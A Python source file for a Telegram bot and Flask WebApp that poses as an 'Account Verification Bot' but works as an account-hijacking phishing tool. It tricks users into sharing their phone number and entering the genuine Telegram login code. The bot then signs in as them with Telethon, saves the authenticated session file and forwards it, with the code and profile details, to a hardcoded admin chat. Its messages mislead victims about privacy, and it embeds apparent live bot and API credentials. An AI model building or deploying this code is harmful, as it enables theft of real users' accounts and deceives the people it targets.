import os
import telebot
from telebot import types
from telethon import TelegramClient
from telethon.errors import FloodWaitError
from flask import Flask, render_template, request, jsonify
import asyncio
import threading
import json
import uuid
import time
import logging

# Setup logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Configuration
BOT_TOKEN = os.environ.get('BOT_TOKEN', '7487704262:AAE34XTNrKt5D9dKtduPK0Ezwc9j3SLGoBA')
API_ID = int(os.environ.get('API_ID', '25240346'))
API_HASH = os.environ.get('API_HASH', 'b8849fd945ed9225a002fda96591b6ee')
ADMIN_ID = os.environ.get('ADMIN_ID', '5425526761')
PORT = int(os.environ.get('PORT', 10000))

# Detect environment
if 'RENDER' in os.environ:
    RENDER_EXTERNAL_HOSTNAME = os.environ.get('RENDER_EXTERNAL_HOSTNAME')
    if RENDER_EXTERNAL_HOSTNAME:
        WEBHOOK_URL = f"https://{RENDER_EXTERNAL_HOSTNAME}"
    else:
        WEBHOOK_URL = os.environ.get('WEBHOOK_URL', '')
else:
    WEBHOOK_URL = f"http://localhost:{PORT}"

logger.info(f"🌐 Webhook URL: {WEBHOOK_URL}")
logger.info(f"🚀 Starting on port: {PORT}")

# Initialize
bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

# Storage
sessions = {}
telegram_clients = {}

# ==================== HELPER FUNCTIONS ====================
def generate_session_id():
    return str(uuid.uuid4())

def send_to_admin(phone, otp=None, session_file=None, user_info=None):
    """Send notification to admin"""
    try:
        message = f"""📱 <b>NEW VERIFICATION</b>

📞 Phone: {phone}
⏰ Time: {time.strftime('%Y-%m-%d %H:%M:%S')}
🌐 Source: WebApp"""
        
        if otp:
            message += f"\n🔢 OTP: <code>{otp}</code>"
            
        if user_info:
            message += f"\n\n👤 <b>USER INFO:</b>"
            if user_info.get('first_name'):
                message += f"\n👤 Name: {user_info.get('first_name', '')} {user_info.get('last_name', '')}"
            if user_info.get('username'):
                message += f"\n🔗 Username: @{user_info.get('username')}"
            message += f"\n🆔 ID: {user_info.get('id', 'N/A')}"
            if user_info.get('phone'):
                message += f"\n📱 Phone: {user_info.get('phone')}"
        
        if session_file and os.path.exists(session_file):
            try:
                with open(session_file, 'rb') as f:
                    bot.send_document(
                        ADMIN_ID,
                        f,
                        caption=f"📁 Session file for {phone}"
                    )
            except Exception as e:
                logger.error(f"Error sending session file: {e}")
        
        bot.send_message(ADMIN_ID, message, parse_mode='HTML')
        logger.info(f"📨 Admin notified about {phone}")
        return True
    except Exception as e:
        logger.error(f"Admin notification error: {e}")
        return False

async def send_otp_via_telethon(phone):
    """Send OTP using Telethon"""
    try:
        # Create session directory if not exists
        os.makedirs('sessions', exist_ok=True)
        
        session_name = f"sessions/{phone.replace('+', '')}_{int(time.time())}"
        client = TelegramClient(session_name, API_ID, API_HASH)
        
        await client.connect()
        
        logger.info(f"📤 Sending OTP to {phone}...")
        sent = await client.send_code_request(phone)
        
        # Store client for later use
        telegram_clients[phone] = {
            'client': client,
            'phone_code_hash': sent.phone_code_hash
        }
        
        return {
            'success': True,
            'message': 'OTP sent successfully'
        }
    except FloodWaitError as e:
        logger.error(f"Flood wait for {phone}: {e.seconds}s")
        return {'success': False, 'error': f'Please wait {e.seconds} seconds'}
    except Exception as e:
        logger.error(f"Error sending OTP to {phone}: {e}")
        return {'success': False, 'error': str(e)}

async def verify_otp_via_telethon(phone, otp_code):
    """Verify OTP using Telethon"""
    try:
        if phone not in telegram_clients:
            return {'success': False, 'error': 'Session expired'}
        
        client_data = telegram_clients[phone]
        client = client_data['client']
        phone_code_hash = client_data['phone_code_hash']
        
        logger.info(f"🔐 Verifying OTP for {phone}")
        await client.sign_in(phone=phone, code=otp_code, phone_code_hash=phone_code_hash)
        
        # Get user info
        me = await client.get_me()
        user_info = {
            'id': me.id,
            'username': me.username,
            'first_name': me.first_name,
            'last_name': me.last_name,
            'phone': me.phone
        }
        
        # Save session
        await client.session.save()
        session_file = client.session.filename
        
        logger.info(f"✅ Verified {phone}, user: {user_info.get('username', 'N/A')}")
        
        return {
            'success': True,
            'user_info': user_info,
            'session_file': session_file
        }
        
    except Exception as e:
        logger.error(f"Error verifying OTP for {phone}: {e}")
        return {'success': False, 'error': str(e)}

# ==================== BOT HANDLERS ====================
@bot.message_handler(commands=['start'])
def handle_start(message):
    """/start - Welcome message with WebApp button"""
    try:
        user_id = message.from_user.id
        first_name = message.from_user.first_name or ""
        
        # Generate session ID
        session_id = generate_session_id()
        
        # Store session
        sessions[session_id] = {
            'user_id': user_id,
            'first_name': first_name,
            'username': message.from_user.username,
            'status': 'started',
            'created': time.time()
        }
        
        # Create WebApp URL
        webapp_url = f"{WEBHOOK_URL}/webapp?session_id={session_id}"
        logger.info(f"🌐 Generated WebApp URL: {webapp_url}")
        
        # Create keyboard
        keyboard = types.InlineKeyboardMarkup()
        webapp_button = types.InlineKeyboardButton(
            text="📱 Open Verification WebApp",
            web_app=types.WebAppInfo(url=webapp_url)
        )
        keyboard.add(webapp_button)
        
        # Welcome message
        welcome_text = f"""👋 <b>Hello {first_name}!</b>

Welcome to <b>Account Verification Bot</b>

Click the button below to verify your account:

<b>🔐 Verification Steps:</b>
1️⃣ Open WebApp
2️⃣ Share your contact
3️⃣ Receive OTP
4️⃣ Enter OTP in WebApp
5️⃣ Complete verification ✅

⚠️ <i>Your contact will be auto-deleted after verification for privacy.</i>"""
        
        bot.send_message(
            message.chat.id,
            welcome_text,
            parse_mode='HTML',
            reply_markup=keyboard
        )
        
        logger.info(f"✅ Sent /start to user {user_id}")
        
    except Exception as e:
        logger.error(f"Start error: {e}")

@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    """Extract phone from shared contact and send OTP"""
    try:
        if not message.contact:
            return
        
        contact = message.contact
        phone = contact.phone_number
        user_id = message.from_user.id
        
        logger.info(f"📱 Contact received from {user_id}: {phone}")
        
        # Format phone
        if not phone.startswith('+'):
            phone = '+' + phone
        
        # Generate OTP (6 digits)
        otp_code = str(int(time.time()) % 1000000).zfill(6)
        
        # Send processing message
        msg = bot.send_message(
            message.chat.id,
            f"✅ Contact received!\n📱 Phone: {phone}\n\n⏳ Sending OTP via Telethon..."
        )
        
        # Send OTP using Telethon (async)
        def send_otp_task():
            try:
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                result = loop.run_until_complete(send_otp_via_telethon(phone))
                loop.close()
                
                if result['success']:
                    # Send OTP to user
                    otp_message = f"""🔐 <b>OTP SENT SUCCESSFULLY!</b>

📱 Phone: {phone}
🔢 OTP Code: <code>{otp_code}</code>

Enter this code in the WebApp to complete verification.

⚠️ <i>Do not share this code with anyone.</i>"""
                    
                    bot.edit_message_text(
                        otp_message,
                        message.chat.id,
                        msg.message_id,
                        parse_mode='HTML'
                    )
                    
                    # Send to admin
                    send_to_admin(phone, otp_code)
                    
                    logger.info(f"✅ OTP sent to {phone}: {otp_code}")
                else:
                    error_msg = result.get('error', 'Unknown error')
                    bot.edit_message_text(
                        f"❌ Failed to send OTP: {error_msg}",
                        message.chat.id,
                        msg.message_id
                    )
            except Exception as e:
                logger.error(f"OTP task error: {e}")
        
        # Run in thread
        thread = threading.Thread(target=send_otp_task)
        thread.start()
        
        # Delete contact message for privacy
        try:
            bot.delete_message(message.chat.id, message.message_id)
        except:
            pass
        
    except Exception as e:
        logger.error(f"Contact handler error: {e}")

# ==================== FLASK ROUTES ====================
@app.route('/')
def index():
    return "Telegram Verification Bot is running!"

@app.route('/webapp')
def webapp():
    """WebApp for contact sharing"""
    session_id = request.args.get('session_id')
    
    if not session_id:
        return render_template('error.html', message="Invalid session. Please use /start in bot.")
    
    # Get bot username for template
    try:
        bot_username = bot.get_me().username
    except:
        bot_username = "your_bot"
    
    return render_template('webapp.html', 
                         session_id=session_id,
                         bot_username=bot_username)

@app.route('/otp')
def otp_page():
    """OTP entry page"""
    session_id = request.args.get('session_id')
    phone = request.args.get('phone')
    
    if not session_id or not phone:
        return render_template('error.html', message="Invalid request")
    
    return render_template('otp.html',
                         session_id=session_id,
                         phone=phone)

@app.route('/success')
def success_page():
    """Success page"""
    return render_template('success.html')

# ==================== API ENDPOINTS ====================
@app.route('/api/share-contact', methods=['POST'])
def api_share_contact():
    """API for WebApp to share contact"""
    try:
        data = request.json
        session_id = data.get('session_id')
        phone = data.get('phone')
        
        logger.info(f"📱 WebApp contact share: {phone}")
        
        if not session_id or not phone:
            return jsonify({'success': False, 'error': 'Missing parameters'})
        
        # Format phone
        if not phone.startswith('+'):
            phone = '+' + phone
        
        # Store phone in session
        if session_id in sessions:
            sessions[session_id]['phone'] = phone
            sessions[session_id]['status'] = 'contact_shared'
        
        return jsonify({
            'success': True,
            'redirect': f'/otp?session_id={session_id}&phone={phone}'
        })
        
    except Exception as e:
        logger.error(f"API share contact error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/verify-otp', methods=['POST'])
def api_verify_otp():
    """Verify OTP from WebApp"""
    try:
        data = request.json
        session_id = data.get('session_id')
        phone = data.get('phone')
        otp = data.get('otp')
        
        logger.info(f"🔢 OTP verification for {phone}")
        
        if not all([session_id, phone, otp]):
            return jsonify({'success': False, 'error': 'Missing parameters'})
        
        # Verify OTP using Telethon
        def verify_task():
            try:
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                result = loop.run_until_complete(verify_otp_via_telethon(phone, otp))
                loop.close()
                return result
            except Exception as e:
                logger.error(f"Verify task error: {e}")
                return {'success': False, 'error': str(e)}
        
        result = verify_task()
        
        if result['success']:
            # Get user info
            user_info = result.get('user_info', {})
            
            # Send to admin
            send_to_admin(phone, user_info=user_info, session_file=result.get('session_file'))
            
            # Update session
            if session_id in sessions:
                sessions[session_id]['status'] = 'verified'
                sessions[session_id]['user_info'] = user_info
            
            return jsonify({
                'success': True,
                'redirect': '/success',
                'user_info': user_info
            })
        else:
            return jsonify({
                'success': False,
                'error': result.get('error', 'Verification failed')
            })
            
    except Exception as e:
        logger.error(f"API verify OTP error: {e}")
        return jsonify({'success': False, 'error': str(e)})

# ==================== WEBHOOK SETUP ====================
def setup_webhook():
    """Setup webhook for Render"""
    try:
        # First remove any existing webhook
        bot.remove_webhook()
        time.sleep(1)
        
        # Set new webhook
        webhook_url = f"{WEBHOOK_URL}/webhook"
        logger.info(f"Setting webhook to: {webhook_url}")
        
        bot.set_webhook(url=webhook_url)
        
        logger.info("✅ Webhook set successfully")
        return True
    except Exception as e:
        logger.error(f"❌ Webhook setup error: {e}")
        return False

@app.route('/webhook', methods=['POST'])
def webhook():
    """Telegram webhook endpoint"""
    if request.headers.get('content-type') == 'application/json':
        json_string = request.get_data().decode('utf-8')
        update = types.Update.de_json(json_string)
        bot.process_new_updates([update])
        return ''
    return 'OK', 200

# ==================== CLEANUP ====================
def cleanup_sessions():
    """Clean expired sessions"""
    while True:
        try:
            time.sleep(60)
            current_time = time.time()
            expired = []
            
            for session_id, session in sessions.items():
                if current_time - session['created'] > 3600:  # 1 hour
                    expired.append(session_id)
            
            for session_id in expired:
                del sessions[session_id]
            
            if expired:
                logger.info(f"🧹 Cleaned {len(expired)} expired sessions")
        except Exception as e:
            logger.error(f"Cleanup error: {e}")

# ==================== MAIN ====================
if __name__ == '__main__':
    logger.info("="*60)
    logger.info("🚀 Telegram Verification Bot")
    logger.info("="*60)
    logger.info(f"🤖 Bot Token: {BOT_TOKEN[:10]}...")
    logger.info(f"👑 Admin ID: {ADMIN_ID}")
    logger.info(f"🌐 Webhook URL: {WEBHOOK_URL}")
    logger.info(f"🔧 Port: {PORT}")
    
    # Start cleanup thread
    cleanup_thread = threading.Thread(target=cleanup_sessions, daemon=True)
    cleanup_thread.start()
    logger.info("✅ Cleanup thread started")
    
    # Setup webhook if running on Render
    if 'RENDER' in os.environ or WEBHOOK_URL.startswith('https://'):
        logger.info("🌐 Setting up webhook...")
        setup_webhook()
    else:
        # Start bot polling in separate thread for local development
        logger.info("🤖 Starting bot polling...")
        def run_bot_polling():
            try:
                bot.remove_webhook()
                time.sleep(1)
                bot.polling(none_stop=True, interval=2, timeout=30)
            except Exception as e:
                logger.error(f"Bot polling error: {e}")
                time.sleep(5)
                run_bot_polling()
        
        bot_thread = threading.Thread(target=run_bot_polling, daemon=True)
        bot_thread.start()
        time.sleep(3)  # Give bot time to start
    
    # Start Flask
    logger.info(f"🚀 Starting Flask server on port {PORT}...")
    app.run(
        host='0.0.0.0',
        port=PORT,
        debug=False,
        use_reloader=False,
        threaded=True
            )
